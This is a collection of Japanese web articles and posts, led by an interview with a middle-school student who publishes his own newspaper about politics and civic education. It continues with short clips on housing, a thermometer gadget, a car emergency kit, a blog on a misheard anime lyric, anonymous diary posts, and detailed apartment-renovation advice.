――川中さんが「日本中学生新聞」を立ち上げたきっかけを教えてください。

いちばん大きかったのは、小学4年生のときに「政治の話をするな」と学校で叱られたことです。

2020年に大阪都構想が持ち上がり、僕の地元である大阪市内でも議論が活発になっていました。あちこちでチラシが配られていたし、テレビで討論会の特集が組まれていたのを覚えています。自分の住む街に直接関係があることなので、僕もとても興味を引かれました。そこで調べてみたら、2015年にも都構想をめぐって住民投票があったこと、そのときは自民党と共産党が「共闘」して反対していたことなどがわかりました。僕は、この2つの党は仲がよくないと思っていたので、意外でしたがいいことだと思いました。

ほかにも、前回は反対派だった公明党が2020年は賛成に転じていること、公職選挙法に縛られる普通の選挙とは違うこともわかって、単純に「面白いなあ」と思ったんです。それで学校でも、友達とその話をするようになりました。みんな地元のことだから興味を持っていて「俺は反対だな」とか、自分の意見を持っている子も少なくなかった。でもその会話を聞いた先生に、「学校でそんな話をしてはいけない」と怒られたんです。

――その件で、家にも電話がかかってきたとか。

はい。先生が僕の親に電話をして、「次に政治の話をしたら、校長室に呼びますよ」と。それで親に叱られることはなかったけれど、僕自身が納得できなかった。話すのがダメならと学校の新聞委員会に入ったのですが、そこで「選挙に行こう」と呼びかける新聞を作ったら、これも政治の話だからと校内掲示してもらえませんでした。だから結局、自分で作るしかなくなったんです。

当時は「小学生である僕には、先生に対抗する手段はないのか？」と悩み、それについても調べました。そうしたら「子どもの権利条約」第12条の意見表明権というものがあるとわかり、これを先生に話してみたんです。でもあまりピンと来なかったようで、抗議が聞き入れられることはなかった。振り返れば、あの悔しさが今につながっているので、ある意味これもよかったと考えるようにしています。

「意見と文句の違いがわかっていない人がすごく多い」

――今はちょうど2号目を制作中とのことですが、新聞の発行を始めて変わったことはありますか？

応援してくれる人は多いし、大阪・関西万博やIRカジノなど、僕が関心を持っていることについて教えてくれる人も増えて、うれしい出会いがたくさんありました。新聞の配布は大阪市内での手渡しがメインですが、書店に置いてもらったり、東京や北海道の人の要望を受けて郵送したりと、読んでくれる人も増えています。

そもそも僕が新聞を作ったのは、昨年開催されたG7広島サミットにメディアとして取材に行きたかったから、というのが大きな理由でした。結局「学生だから」「法人じゃないから」という理由で申請すらさせてもらえませんでしたが、そこから実際に活動を始めて強く感じたのは、日本社会がどれだけ疲弊しているかということでした。

――サミットの取材は許可されなかったのですね。しかし「社会の疲弊」とは？

例えば僕は今、大阪・関西万博とIRカジノに興味を持っています。これも都構想と同じく、自分の街のことでもあり身近なことです。万博は次世代のためにやると言っていますが、僕ら子どもが本当に求めていることってこれなのかな？ とちょっと疑問に感じています。

僕自身は、クルマが空を飛ぶ社会よりも、近所の商店街がずっと元気で活気があるような、あたたかい社会のほうがいいと思う。肉屋のラードで揚げたコロッケが胃もたれするけど好きやねんとか、そういう顔の見える社会です。でも今の社会はそうではないのかなと、たくさんの大人からの誹謗中傷で「社会の疲弊」を実感しているんです。意見や批判と、単なるアンチ、文句や悪口の違いがわかっていない人がすごく多いんだと思います。

――悪意のある声を寄せる人たちにはどう対処されているのでしょうか。

基本的には気にしないようにしていますが、それでも傷つかないわけじゃない。疲れたときにはドラえもんの大長編映画を見たりして癒されていますが（笑）、僕に文句を言っても社会は変わらないのに、そうせずにいられないのはなぜだろうと考えます。重要なのはどっちの意見が正しいかではなく、議論を重ねていいところを組み合わせていくことで、よりよい社会にしていくことだと思います。アンチは議論を生まないし、だから主権者教育（市民教育・シティズンシップ教育）が大事なんだと改めて思うようになりました。

――主権者教育は選挙権年齢の引き下げもあって、現在ではほとんどの高校で行われるようになりました。

僕は高校生からでは遅いと思っています。学校でも「欧米って学校のルールを生徒が決められるらしいよ」「そういうのいいよな」などと友達と話したりしますが、じゃあ今の学校で何ができるかというと難しい。小6のときに学んだ公民も、議員定数などのシステムをさらりと学んだだけで物足りないと感じました。これじゃ政治も民主主義もただの暗記でしかなく、わがことにはならないなと。義務教育のうちから、しっかり学ばせてほしいと思っています。

「政治にハマっている」から、無関係だとは思わない

――学校生活の中で、主権者教育や民主主義について考える機会はありますか？

僕の学校は半期に1度生徒会選挙があるのですが、前期は、生徒の声を学校に届ける「意見箱」を設置するという公約で生徒会長に立候補して当選しました。でも後期は落選してしまった。主権者教育の大切さを伝え、校則をみんなで決められるようにしようと訴えたのですが、演説後、友達に「応援はしてたけど、難しくて何を言ってるのかよくわからなかった」と言われました。

実際に生徒会長を務めてみて思ったのは、学校の権力はやっぱり先生にあるんだなということ。上からの指示には従わなければいけないし、先生方も新自由主義的な教育で育っているから、大変なのはわかります。これについては政治が悪いと思う。でも、今の学校はみんなが意見を言える場所ではないと思います。最終的に多数決で決めるとしても、自分と違う意見も尊重することで誰もが発言しやすくして、議論する過程が大切なのではないでしょうか。僕は友達とも積極的に議論するようにしていますが、それは文句や否定ではないし、議論することでけんかしたり仲が悪くなったりすることはありません。

――今は友達と政治の話をすることもあるのですね。

先生に怒られることはなくなりましたが、友達に「知ってる政治家はいる？」と聞いても、岸田首相と吉村大阪府知事ぐらいしか知らないんです。大阪市長はテレビに出ていないから知らない、と。選挙前になると、18歳とか20歳とかの若い人が「どうせ変わらないし、関係ないから投票には行かない」などとインタビューに答えているのもよく見ます。関心が低いんですよね。

僕は趣味などやりたいことはとことんやりたいし、負けず嫌いなところもある。そういう性格もあって、言い方が正しいかわからないけれど、小4のあのときから政治に「ハマっている」んだと思います。

――なるほど。だから興味を持ち続けられるし、自分に関係ないと思わずにいられるのですね。まず関心を持つことが大事だと思うので、「ハマっている」というのはいいと思います。

そうですか（笑）。プロ野球だと、選手のカードや名鑑があるじゃないですか。仲よくしてくださっているフリーライターの畠山理仁さんもよく言っているのですが、ああいうものの政治家バージョンがあってもいいと思うんです。おもちゃメーカーさんにはぜひ作ってほしい。

政治はそれくらい身近であってほしいし、無関心でいられても無関係ではいられないものです。選挙権のない僕ができることとして、「投票に行こう」という呼びかけもしています。

――そうした呼びかけのほかに、今後取り組んでいきたいことはありますか？

今いちばんやりたいのは、国会会期中に傍聴に行くこと。学校があるので難しいのですが、いつか実行したいです。それから政治家の方にも取材してみたい。去年の12月に菅直人さんに取材依頼を出したのですが、武蔵野市議の補選でお忙しかったみたいで、取材はできませんでした。維新政治のことや世襲制についても聞いてみたかったです。

僕はまだ中学生だし、たくさんの人との出会いや議論の中で勉強させてもらっている真っ最中。いろいろな意見に触れながら、この先もできることを考えて行動していきたいと思います。

（文：鈴木絢子、写真：川中さん提供）
Title: ｢日本中学生新聞｣を発行する中1が考える､学校と日本の民主主義とは | 東洋経済education×ICT

Link: https://courrier.jp/news/archives/354785/
Content: Text by Leo Lewis

日本の住宅メーカーは、需要が頭打ちとなった国内市場に見切りをつけ、米国進出に意欲的だ。「不況」と「労働力不足」という二大悪条件下で切磋琢磨してきた日本企業の参入は、米国の住宅事情に大きな変化をもたらすだろうと、英経済紙は指摘する。

遺灰を大きな風船に入れて成層圏で散骨する「バルーン葬」、嚥下しやすい柔らかいビスケット、運転免許証を自主返納した高齢者向けの割引サービス──少子高齢化はこれまで、日本社会に思いもよらない新たな商機をもたらしてきた。さらに日本の人口動態の変化は、親と同居する18～29歳の米国人にも影響を及ぼそうとしている。2300万人に達するこの巨大な集団が、ついに実家から旅立つ日がやってくるかもしれない。1月、日本の大手住宅メーカー積水ハウスが、米コロラド州で戸建て住宅事業を手掛けるM.D.C.ホールディングス（MDC）を49億5000万ドル（約7200億円）で買収すると発表した。これは日本企業による業界最大規模の買収だ。米国住宅メーカーにおける合算引き渡し戸数で積水ハウスは5位となった。
Title: 日本の住宅メーカーは「実家離れできない」米国人の独立を後押しできるか | 積水ハウス「7200億円買収」が生む緊張

Link: https://togetter.com/li/2316955
Content: リンク www.pizza-la.co.jp 【ピザーラ】宅配ピザ（デリバリーピザ・お持ち帰り・出前）をネットで注文。 簡単ネット注文でピザをご自宅へデリバリー(出前)できます。 宅配ピザチェーンのピザーラ公式サイト。地域別メニュー、お得なキャンペーン、ＣＭ情報などをご紹介 127 users

届けられる側の寛容さも素敵

もしかしたら別の対応の方が良かったのでは？という声もあったが...

咄嗟に動けることが何よりも素晴らしいのでは
Title: 宅配ピザを頼んだら「配達の者が倒れているお爺さんを救護し救急車を待っているため遅れます」との電話が...その後のオチも含め心温まるお話

Link: https://togetter.com/li/2316712
Content: みんなの反応
Title: 夜中に起きてしまう子供がぐっすり朝まで寝てくれるライフハック「ママ2号」→「３日ほど育てると良い感じ」「マジで寝てくれる」

Link: https://togetter.com/li/2317404
Content: 秋田市はブロッコリーと清酒か 両方きのう飲食したなあ x.com/nhk_seikatsu/s…
Title: 青森市はカップ麺、浜松市はハンバーグ…家計調査の「食べ物消費額」が面白い！あなたの街の消費No.1はなんですか？

Link: https://news.yahoo.co.jp/pickup/6492000
Content: 5796 コメント 5796 件

「子どもがほしくない」と考える20代が増えている。2023年に行われた民間の調査（BIGLOBE「Z世代の意識調査」）によると、18～25歳の約5割が子どもをほしいと思っていないという結果が出た。理由を尋ねると、「お金の問題」以外でもっとも多かったのが、「育てる自信がない」。5割を超えていた（複数回答）。なぜ20代は子どもを育てる自信がないと思っているのだろう。当事者と専門家に聞いた。（取材・文：篠藤ゆり／Yahoo!ニュース オリジナル 特集編集部）
Title: 「自己責任」重い 子を望まぬ20代 - Yahoo!ニュース

Link: https://anond.hatelabo.jp/20240218100628
Content: anond:20240217203534

この増田を見てて思ったんだが、モテ増田でも普通に失敗する様だし

ホテル＝OKが女性の常識ではないのは明らかだよな





でも多くの男性はホテルについてきたんだからOKだろと言う

そこで疑問が浮かぶよね？

男性は生まれてからどんなタイミングでどこから「ホテル＝OK」だと学ぶのか

男友達からなのか、表現物の受け売りなのか…

実体験ベースならモテ増田でも3人成功1人失敗だから「ホテル＝OK」に疑問を持つはずだが

モテ増田は女性に疑問を抱くほど「ホテル＝OK」に自信を持っているっぽい

正直性交率90%と仮定しても「たまたま失敗に当たっちゃったかーしゃーない」で終わるはず





モテ増田の様な反応は性交率100%と信じ切ってないと起きない反応だ

男性はどこからそんな信憑性を導き出したのか気になる

ツイートシェア
Title: 男性ってどのタイミングで「ホテル＝OK」と学ぶんだろう？

Link: https://netafull.net/gadget/0145586.html
Content: 3年近く月イチペースでキャンプをしていると、下は氷点下から上は37度まで、様々な気温を体験してきました。そしてかねがね、現場の気温をちゃんと記録しておきたいと気にかけていました。

そんなニーズにぴったりの温度計ガジェットを見つけました。スマートフォンとBluetoothで接続できる「SwitchBot 防水温湿度計」です。価格も1,980円とお手頃です。

身近な気温を知りたい

自室の温度と湿度は「ATOM Sensor V2」で記録しています。これはこれでとても良いもので、1年を通して仕事部屋の温湿度を記録、チェックしています。たまに前年のデータを振り返ったり、重宝しています。

さらに知りたいと思っていたのは、窓の外の温度です。最近はピンポイントで細分化された地域の天気を知ることもできるようになりましたが、この窓の外に温度計を置きたい！

あと、キャンプに行った時に、現地の温度が何度なのかも知りたいと思っていました。

窓の外に部屋の中に向けて温度計を取り付けたり、キャンプに温度計を持っていけば良かったワケですが、スマートフォンと接続できる「SwitchBot 防水温湿度計」を見つけて「これだ！」と思いました。

価格も1,980円。即購入です。

「SwitchBot 防水温湿度計」とは

「SwitchBot 防水温湿度計」は、Bluetoothでスマートフォンと接続することができる温湿度計です。IP65規格の防水・防塵構造なので、窓の外に置いておいたり、キャンプに持っていっても安心です。

スイス製の高精度温湿度センサーを内蔵し、温湿度の変化を精確に感知できます。4秒ごとに温湿度を計測し、温度は0.1度から、湿度は1%から測定可能です。

スマートフォンとは、Bluetoothでダイレクトに接続することができます。もし外部からチェックしたい場合は、SwitchBotハブを経由することで、リモートアクセスが可能になります。

SwitchBotハブがあると、AlexaやGoogleアシスタント、Siriでの音声コントロールも可能になりますし、温度が上がったらエアコンを入れるとか、設定温度を超えたら通知を受け取るといった連携も可能になります。

とはいえ、今回はそこまでの機能は求めていません。シンプルに「SwitchBot 防水温湿度計」がある場所の温湿度がわかればOKなので、1,980円の本体のみで実現します。

パッケージに入っているものもシンプルで、マニュアル類のほか、3Mの両面テープ、ストラップくらいのものです。

スマートフォンにアプリをダウンロードし、Bluetoothで「SwitchBot 防水温湿度計」を検索して登録するだけで、すぐに使い始めることができます。

「SwitchBot 防水温湿度計」本体を見てみる

「SwitchBot 防水温湿度計」本体の表です。

「SwitchBot 防水温湿度計」本体の裏です。

手のひらというか、指くらいのサイズ感です。

製品サイズは、6 x 2.8 x 2 cm、44gと極小です。

裏蓋を開けると、単4電池が2本入っています。使用時には絶縁シートを外します。電池寿命は約2年で、交換が必要になった場合はアプリから通知されます。

スマートフォンから連携するための、裏蓋内にあるボタンを長押しすると、Bluetoothで「SwitchBot 防水温湿度計」がサーチできるようになります。

裏蓋には、防水加工がしてあります。

「SwitchBot 防水温湿度計」はコンパクトで持ち運びもしやすいです。車内やキーホルダー、リュック、ベビーカーに取り付けて、周囲や屋外の温湿度の変化を常に計測することができます。特に夏場は熱中症対策に役立ちます。

「SwitchBot 防水温湿度計」アプリをチェック

Bluetoothで接続できる範囲でアプリを起動すると「SwitchBot 防水温湿度計」からデータがダウンロードされ、見やすく表示されます。

乱高下していますが「SwitchBot 防水温湿度計」をカバンに入れて移動していたので「自分がいた場所の温度と湿度」が表示されています。

定点観測しているのではなく、あくまでも「自分がいる場所の温度」を計るために「SwitchBot 防水温湿度計」を利用しています。

「SwitchBot 防水温湿度計」は単体で68日分のデータをローカルに保存できます。アプリからは、データのエクスポート、削除が可能です。

「SwitchBot 防水温湿度計」感想

まずは、自分で実現したかった「窓の外の気温を計測する」は、窓の外に「SwitchBot 防水温湿度計」を置くことで実現できています。

身近なところに「SwitchBot 防水温湿度計」を置いておけば、とりあえず勝手に温湿度を計測し、記録してくれているのは手軽です。まさに求めていた機能を実現しています。

月末にキャンプに行く予定があるので、次はそこで「SwitchBot 防水温湿度計」を試してみようと思います。

もし留守番するペットの環境チェックに使いたいのであれば「SwitchBotハブ」を追加して連携したり「ATOM Sensor V2」を使うのがオススメです。

「SwitchBotハブ」は、SwitchBot製品がネットと連携するための“窓口”の役割をします。「SwitchBotハブ2」に連携すれば、防水温湿度計で計測した温湿度をハブ2のディスプレイに表示することができます。

室内用なら、液晶ディスプレイを搭載した「SwitchBot 温湿度計」もあります。
Title: 【SwitchBot】キャンプで気温を記録する用にBluetoothの防水温湿度計を購入してみた - ネタフル

Link: https://www.roomie.jp/2024/02/1169725/
Content: 134 948

※本記事は2023年7月24日に公開された記事の再編集です。

Text and Photographed by 良品生活

近年、災害が増えていますよね。

車で立ち往生した、なんてニュースも目にします。

車で待機しなければならない状況でも安心できるように、食料・水・トイレなど、生きるために最低限必要なものは車の中に入れておきたいですよね。

何を用意すればいいかわからない、という皆さん。

最初から必要なモノが揃ってる「非常用車載セット」で手軽に備えませんか？

キングジム「非常用車載セット」

キングジム 「非常用車載セット」 3,700円（税別）

なんと、文具メーカーのキングジムから登場した「非常用車載セット」。

A5サイズでコンパクトなので、車の中でも省スペースで置いておけます。

デザインまで素敵なのは、さすがキングジムですね。

災害による通行止め、渋滞による車内滞在、天候による立ち往生。

どれも、昨今よく耳にすることですよね。他人事じゃない。

災害の他にも、事故に遭ったり、車が故障してしまった際も、備えがあるのとないのでは安心感が段違いですよね！

コンパクトだけど充実してる

コンパクトながら、中身は充実してるんですよ。

水や食料は6年間もつので、最大6年間そのまま車の中に置いておけます。

500ｍl水、軍手、マスク、非常時連絡カード、クッキー、飴、非常用トイレ、アルミシート、ホイッスル、鉛筆、ティッシュ、アイマスク。

12種類15点、思ったよりたっぷり入っていますよね！

氷砂糖も入っています。

氷砂糖って暑くても溶けにくいですし、賞味期限がないですし、大事なエネルギー源になるんですよ。

非常用連絡カードも入っています。

車を離れる際は、これを書いて立てておくと緊急用伝言メモとして使えます。

鉛筆やアイマスクまで入ってるのがありがたい。

-20℃〜80℃の過酷な環境まで対応！

でも、ずっと車に置いておくなんて、特に真夏は不安ですよね。

なんとなく傷みそうな気がします。

でもこのセットは、なんと-20℃〜80℃までOKなんですって！

炎天下の車内はものすごく熱くなりますが、トランクや座席シートの下なら、80℃を超えることはないようです。

ただ、さすがに直射日光はNGなので、直接日の当たらない場所に置いてくださいね！

あと、箱が紙製なので、水で濡れない場所がよさそうです。

片手で持てるほどのコンパクトなセットですが、これで不安が減らせたらいいですよね！

いつどこで何が起こるかわからない時代です。

もし車に閉じ込められたとしても、数時間はしのげる備えはしておきたいですね。

これをベースに必要なものを詰め込んで、備えておきましょう！
Title: キングジムの「非常用車載セット」が、防災初心者さんにおすすめな理由は… | ROOMIE（ルーミー）

Link: https://togetter.com/li/2316704
Content: ★★★☆☆3.48 ■大粒生牡蠣と20種類以上の貝と浜焼き！コロナ対策で免疫力UPしませんか!! ■予算(夜):￥4,000～￥4,999

ウワモノは勿論のこと縁の下の野菜達が沁み沁みウマかったからまた行きたい 単品ウマけりゃ獺祭飲み放 x.com/koro_se/status…
Title: 「イエーイ主治医見てる～？今からこれ食べま～す❤」爆弾いっぱいだけど美味しそうな『痛風鍋』のインパクト「地球最後の日の食事」

Link: https://ameblo.jp/mangetsuhakase/entry-11879334668.html
Content: あなたは「重いコンダラ」伝説をどのように認識していますか。

おれはといえば、なぜこんな伝説があるのか昔から理解不能なのであるが。この問題に関しては、過去に幸いにもあの望月智充氏の優れた論文がある（『巨人の星』DVDボックス付録の「コレクターズブック」に掲載）。タイトルは「重いコンダラ史研究レポート」で、2001年に書かれたものだ。

今回から３回にわたって、この論文を丸ごと転載したい（以下は転載です）。

☆ ☆ ☆ ☆ ☆

コンダラのことを初めて見聞きしたのは、いつどこでだったろう。たぶん学生時代に「ぴあ」の「はみだし」で読んだのだと思う（80年代初頭ね）。それ以来、めったやたらと目にするようになったわけだな。

「はみだし」のような軽い投稿欄には、私は昔こんな勘違いをしてました、というネタがよくある。中でも代表的な三つを「日本三大勘違いネタ」と呼ぶことは皆さんご存じであろう（いま私が制定したばかりなので、あるいはご存じないかも知れない）。

三大勘違いネタその１は、「月極駐車場という看板があちこちにあるので、そういう駐車場チェーンがあるんだと思ってた」というもの。その２は、「うさぎ追いしかの山という歌詞を、うさぎが美味しい山だと思っていた」。そしてその３が、「『巨人の星』のオープニングで“おもいこんだら”と歌う時に飛雄馬が重そうなローラーを引いていたから、あれはコンダラという名前なんだと信じていた」というものだ。

ね、どれも聞いたことがあるでしょ？

その１とその２は、あるいはそんな風に思ったという人が複数いたとしても、まあ不思議はないといってもいい。しかしその３に関してはどうなんだろうか。日本国民の一定数がほんとにコンダラことを信じていたのだろうか（シャレです念の為）。以前に雑誌の「宝島」でこの勘違いを「おもこ」と名づけていたらしいので、ここでもそう呼んでみることにしよう。これからこの「おもこ」問題を考察し、歴史の真実を検証していきたいと思うわけである。

まず確認しておこう。『巨人の星』オープニングの映像に、地ならしローラーさんは１カットたりとも出演していない、ということを。これはすべての前提となる重要な事実なので覚えておくように。

それなのにああそれなのに、「思いこんだら」を「重いコンダラ」だと思っていた、なぜなら飛雄馬がオープニングでローラーを引いていたから、と主張する「おもこ」派の人々が跡を絶たないのだよ。

変なことを「思いこ」む人がいるもんだなあ、と考えながら十数年過ごしてきたある日、割と硬い本に「おもこ」が登場しているのを発見してしまった。本の名は『日本語研究所』（城生伯太郎・日本実業出版社・1994年）。その中の「アニメソングの言語学」という章に、『巨人の星』オープニングについてこう書かれている。

「星飛雄馬が大きなローラーを引きながらグランドを整備している絵が画面に流れるので、重いローラーのことを『コンダラ』というのだと、多くの子供たちが誤解したといいます」

この著者が現物を確かめずに書いているのは明らかだ。さらには、アニメソングの作詞者はこういう誤解を与えないよう気をつけなさい、みたいな説教までなされている。ちょっとムカッとしたぞ。

この項つづく。
Title: 『重いコンダラ史研究レポート・1』

Link: https://togetter.com/li/2316862
Content: 知らなかった

なんでダイキンが？
Title: エアコンや空気清浄機で有名なダイキンは意外なことに戦車用の砲弾を作っていたりする「元々こっちが本業」「戦艦大和のエアコンも作っていた」

Link: https://anond.hatelabo.jp/20240218184733
Content: ■ レシピに「竹串がスッと通るくらい」という文があるのは竹串業界の陰謀だと思う

だってそんな時くらいしか竹串って使わなくないか？

みたらし団子とかは作らずに買うし。

家庭で竹串を使わせるために、「茹で具合を確かめるには竹串」と刷り込んでるんじゃないのか？

騙されるな！俺はフォークで確かめるぞ！

ツイートシェア
Title: レシピに「竹串がスッと通るくらい」という文があるのは竹串業界の陰謀だと思う

Link: https://anond.hatelabo.jp/20240218115032
Content: ■ 頭のいいひと教えてくれ。日本は内需の国なのに、なんで輸出のために日本人を貧乏にしたがるの？

日本の外需依存度

https://www.fukurou.win/trade1/

日本は14.6%





なのにだ

円安で輸出が好調です！と喜ぶのはなんなんだ？

上手く言えないけど大谷翔平の給料が1000億円だってニュースに喜んでるおっさんみたいだよね

でもさ、この輸出の好調さって円安にして日本人の消費力を削って手に入れたものだからさ

当然のようにGDPがマイナスになるっていう

日本、予想外の景気後退入り GDPが2期連続マイナス

https://www.bbc.com/japanese/articles/clk8137y0yvo

このニュースみても、そりゃそうだよね日本は内需の国なんだから

としか思わないんだよね

こんな馬鹿なことを30年繰り返している





日本は内需の国なのだから、日本人が消費をして日本企業が潤うんだよ

なのになぜかこんな輸出主義みたいなことになってるわけ？

その結果、日本人は車を買えなくなった

「EV」が日本で普及しない超シンプルな理由 航続距離？ 充電インフラ？ いやいや違います

https://merkmal-biz.jp/post/55724

クルマは本当に高くなったのか？

https://www.itmedia.co.jp/business/articles/1604/25/news055.html





輸出のために、つまり外国人に日本製を安く買ってもらうために、日本人の給料を削るという本末転倒なことをやってるわけ

意味が分からないｗ

しかも、いままでは輸出品の話だったが、いよいよ国内でもそうなって日本人はホテルにも泊まれなくなった

TVで「ホテル料金の高騰で日本人が泊まれなくなっている」という特集←外国人はラグジュアリーホテルで日本人は街外れにあるコンテナホテルで満足！というオチに引いた…

https://togetter.com/li/2314892

外国人様に安い日本を堪能してもらうためにホテルを用意しました、日本人はコンテナに泊ってろ！





内需の国なのに日本人の給料を削り内需をボロボロにして、車が買えず、ホテルに泊まれず

でも輸出は好調で、外国人は旅行で安い日本を楽しんでニコニコしてます

なにこれ





頭のいいひと、本当にこれでいいの？

なんで偉い人たちはこんなことやってるわけ？





追記

なんでこんなに伸びてんだ

ごめんよ何も返せないです

勉強します

ツイートシェア
Title: 頭のいいひと教えてくれ。日本は内需の国なのに、なんで輸出のために日本人を貧乏にしたがるの？

Link: https://togetter.com/li/2312364
Content: 結局、コメダ最強！？

喫煙者目線
Title: 【喫茶店まとめ】コーヒー単体の値段だけのソートであんま重宝するイメージが沸かない←同意すぎたのでおかわり半額などの付加要素まとめてみました！

Link: https://kanazawa10no3.hatenablog.com/entry/2024/02/18/170300
Content: 金沢おもしろ発掘は、金沢の街を歩いて発見した「おもしろいもの」を紹介するブログです。

街並みや風景、伝統工芸品、銘菓、おいしいお店、面白い看板など、金沢の魅力をさまざまな角度から発信してます。
Title: うどん万福「鶏からカレーうどん」 - 金沢おもしろ発掘

Link: https://anond.hatelabo.jp/20240217193512
Content: 本来は親友に向けたマンションリフォームのアドバイスだが、LINEで送るには長すぎるので、増田の日記として公にさらしてみる。ブコメやトラバで有用な反論が得られるかもしれない。

祝1000user超え。いろんな意見が聞けて楽しい。おそうじ浴槽がみんなに届いてうれしい。

増田は建築士としてそれなりに経験値はあるが、住まいのあり方や価値観は本当に多様なので、N=1の意見として参照するぐらいがちょうどよい。

適切な断熱壁と二重ガラス樹脂サッシが装備されていること。それがない建築が許されるのは安藤忠雄だけ。

風呂編

おそうじ浴槽！これが言いたくてこの長い日記を書いているといっても過言ではない。

google:image:おそうじ浴槽

他の設備投資を削ってでもこれを装備してほしい。日々の家事から風呂そうじを排除できるのでオススメ。

じゃあ何を削ればいいかというと、、、

鏡→いらない。水アカ掃除の手間を増やすだけ。

化粧棚→いらない。必要に応じて山崎実業のマグネット収納をつかえばよい。

浴室乾燥機→いらない。アイリスオーヤマの除湿器で代用できる。風呂の入り口付近にコンセントを用意しておく。

上下するシャワーフック→これはいる。が、山崎実業のマグネットフックで代用可能。

風呂のサイズは1620か1616にする。この2つは浴槽が1.6mあるから足を伸ばせる。そのほかの1416とか1418 etcは浴槽が1.4mになってしまう。

ただし1616は一般に住宅用しかない。なぜか1620はマンション用もある。住宅用とマンション用の違いは施工に必要な天井の高さ（これショールームのスタッフすら知らなかったりする）。マンション用のほうが必要高が低いので、排水の勾配など制約の多いマンションでも施工できる。逆に言えばその制約さえクリアできれば住宅用をマンションに施工することも可能。

最近は1616でもマンション用があるとのこと。TOTOは1717というさらに浴槽が大きいやつもあるらしい。トラバ感謝。

なお換気扇は選べるならパナソニック製をオススメする。パナソニック以外は換気扇の羽を外すことができない。

それでお前は何にした

ノーリツのユニットバス1616。標準でおそうじ浴槽がついてくる。なぜならおそうじ浴槽はノーリツの特許だから。

だがコスパが高すぎて儲からなかったのかノーリツはユニットバス事業から撤退してしまった。。。

床編

なぜか無垢フローリングにあこがれる人が多いが、高いし隙間が空くしメンテも大変で何がいいのかさっぱりわからん。オススメは厚突きフローリング。無垢の質感とべニヤの寸法安定性を両立している。

薄い突板のフローリングは偽物感がすごいので、だったら偽物でいい。

マンションだと防音フローリングといってふにゃふにゃのフローリングを勧めてくる工務店がいるが、これは工務店の施工が楽になる建材でユーザーにメリットはない。下地側で防音は確保できる。

仕上げの塗装

ウレタン塗装やUV塗装は強靭で水を放置しても浸透しない。ただし傷ついたときの補修はプロに依頼しないといけない。自然ワックス仕上げは質感に優れるが、醤油をこぼしたのを一晩放置すると浸透してシミになる。数年おきに塗り直しが必要だが自分でDIYできる。どっちが良いかはお好みで。

それでお前は何にした

ニッシンイクス150mmオーク自然オイル仕上げ／30度ナナメ貼り。

複合オーク150幅 | 無垢・複合フローリング・不燃ボード｜NISSIN EX.

本当はヘリンボーンにしたかったがめっちゃ高いのでナナメ張り。

温水式にしよう。電気式は暖まるまでの時間がかかりすぎて実用的でない。

壁や天井の仕上げ

躯体あらわし！中古マンションでなければできない仕上げ！天井は水漏れでカビてなければそのままつかえるはず。ぜひやろう。

壁

壁面は大抵のマンションで解体後にGLボンドという接着剤が盛大に残るので、上から塗装するかそのままにするかを判断する必要がある。

google:image:GLボンド 撤去

マンションリフォームの事例集で綺麗なコンクリート壁がでてくる場合があるが、あれはもう一回壁を仕上げなおしている。

余談だが世の中のほとんどのコンクリート打ちっぱなしの建築は、コンクリの上から打ちっぱなし風の塗装をしている（安藤忠雄のように本物のコンクリートで打ちっぱなしを仕上げるのはものすごく難しい）。一般人はその塗装をみて「やっぱコンクリート打ちっぱなしはかっこいいねー」と言っている。それは塗装だ。

たまに「コンクリート打ちっぱなしって寒くないの？」と聞かれるが、それは断熱が入っていない建築をイメージしているから。なので安藤忠雄の住宅は夏暑いし冬寒い。なお忠雄本人はタワマンに住んでいる。

マンションの場合、隣や上階に部屋があればそこが断熱として効くので打ちっぱなしでも大丈夫。

ただし床は例外。熱伝導率が高いので皮膚が触れたときに同じ温度でもコンクリートやタイルのほうが冷たく感じる。

それでお前は何にした

壁面はGLボンド撤去の上、塗装。一部モルタル塗り直し。一般の壁はAEP塗装の白マット仕上げ。寝室とクローゼットはモイスという調湿建材。壁紙はきらいなので未使用。

食洗器

海外勢のデカイ食洗器をいれよう。パナソニックのビルトインは買ってはいけない。あれは卓上タイプよりも食器が入らない。

海外食洗器をキッチンをいれるときは、床から天板の下端までの高さに注意してほしい。日本だとミーレがデカい顔をしてぼったくり価格で売っているが、これは高さが80cmでギリギリ日本の一般的なシステムキッチンに入る寸法だからだ。AEGやボッシュは82cm以上を要求するので、日本の一般的な85cmの高さのカウンターだと入らないことが多い。逆に言えばとにかく下を82cm確保すればどのメーカーでも入る。AEGはカゴがリフトアップする。ボッシュは耐久性が高い。ガゲナウはボッシュの見た目をかっこよくしただけ。IKEAはAEGのリフトアップを削除した廉価版。ミーレはぼったくり（2回目）。

ガスorIH

中華料理命！でなければIHをオススメする。加熱時に上昇気流が発生しないから油が飛び散りにくいし、使っていないときはフラットだからほかの用途に使える。勝間和代氏はIHのガラスの上でうどんこねてた。

それでお前は何にした

コスト削減のためシステムキッチンは購入せず、天板だけ買って大工さんに施工してもらった。天板の下は無印の収納を突っ込んでいる。これで百万ぐらいコスト削減。天板はシゲル工業で作ってもらった。スクエアシンクって手で溶接するからめっちゃ高いんだけど、ここはプレス品だから安い。

スクエアシンク | ステンレスワークトップとキッチンシンク製造のシゲル工業

その他に検討したのはキッチンハウスのグラフテクト。今でもグラフテクトはアリだと思っている。

GRAFTEKT -グラフテクト- | 家具のようなキッチン・システムキッチン

水栓はLIXILのナビッシュA6。濡れた手で触らないので、水栓周りがよごれにくい。

https://www.lixil.co.jp/lineup/faucet/navish/

換気扇はパナのDEシリーズかフジオーにしよう。メンテがしやすい。

パナはDWという10年掃除不要と謳っている製品を推しているが、あれは代わりに一切のメンテができず、10年で本体交換を必要とする地雷。

IHもパナ。グリルまでIHにしている唯一のメーカー。このグリルが優秀で、オーブン代わりになるし、パンもおいしく焼ける。おかげでヘルシオとバルミューダトースターが不要になった。

洗面台

水栓は垂直面から生えたやつにすべし。立ち水栓は根本が汚れる。ダブルボウルは便利だが、なくてもなんとかなる。

それでお前は

LIXILのYL-537を2台設置。洗面台と水栓が一体型で、かつ壁から水栓が生えている。本来は公共施設用のものなので耐久性が高い。それでいてシステム洗面台より安い。いいことづくめ。唯一の弱点は排水トラップが真下に生えるから下の収納に制約がでる。

ガスコンセントを引いておくと、ガスファンヒーターで冬の風呂上がりの寒さや洗面所の足元の冷えを解消できる。乾太くんやガス炊飯器もそうだが現代のガス機器は超優秀なのにマイナーなのでもっと評価されるべき。

